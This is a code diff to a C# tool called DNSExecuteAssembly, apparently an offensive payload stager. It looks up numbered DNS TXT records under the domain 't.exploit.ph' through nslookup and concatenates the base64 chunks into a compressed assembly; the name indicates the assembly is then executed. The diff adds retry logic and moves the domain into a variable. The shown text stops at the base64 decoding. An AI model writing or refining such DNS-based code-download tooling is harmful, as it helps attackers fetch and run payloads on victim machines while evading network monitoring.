@@ -20,7 +20,7 @@ namespace DNSExecuteAssembly
     class DNSExecuteAssembly
     {
 
-        static string GetTxtRecords(string hostname)
+        static string GetTxtRecords(string hostname, int count)
         {
             string output;
             var startInfo = new ProcessStartInfo("nslookup");
@@ -37,6 +37,14 @@ namespace DNSExecuteAssembly
             output = Regex.Replace(output, @"Server:\s*([A-Za-z0-9\.\r\n\s:]*)", "");
             output = Regex.Replace(output, @"[A-Za-z0-9\.\-]*\s*text =\s*""", "");
             output = Regex.Replace(output, @"([""\s])", "");
+            if (string.IsNullOrEmpty(output))
+            {
+                if (count < 10)
+                {
+                    count += 1;
+                    output = GetTxtRecords(hostname, count);
+                }
+            }
 
            
             return output;
@@ -46,6 +54,7 @@ namespace DNSExecuteAssembly
         {
             string assemblyPath = String.Empty;
             byte[] assemblyBytes;
+            string domain = "t.exploit.ph";
 
             // Validating args
             if (args.Length == 0)
@@ -68,8 +77,8 @@ namespace DNSExecuteAssembly
                 return;
             }
 
-            string SearchRecord = string.Format("{0}-cs.t.exploit.ph.", args[0]);
-            string Record = GetTxtRecords(SearchRecord);
+            string SearchRecord = string.Format("{0}-cs.{1}.", args[0], domain);
+            string Record = GetTxtRecords(SearchRecord, 0);
             int end = Int32.Parse(Record);
             IEnumerable<int> recordnums = Enumerable.Range(0, end);
 
@@ -77,8 +86,8 @@ namespace DNSExecuteAssembly
             string EncodedAssembly = String.Empty;
             foreach (int num in recordnums)
             {
-                string CurrentRecordHost = string.Format("{0}-{1}-cs.t.exploit.ph.", num, args[0]);
-                string CurrentRecord = GetTxtRecords(CurrentRecordHost);
+                string CurrentRecordHost = string.Format("{0}-{1}-cs.{2}.", num, args[0], domain);
+                string CurrentRecord = GetTxtRecords(CurrentRecordHost, 0);
                 EncodedAssembly = string.Concat(EncodedAssembly, CurrentRecord);
             }
             var CompressedAssembly = Convert.FromBase64String(EncodedAssembly);
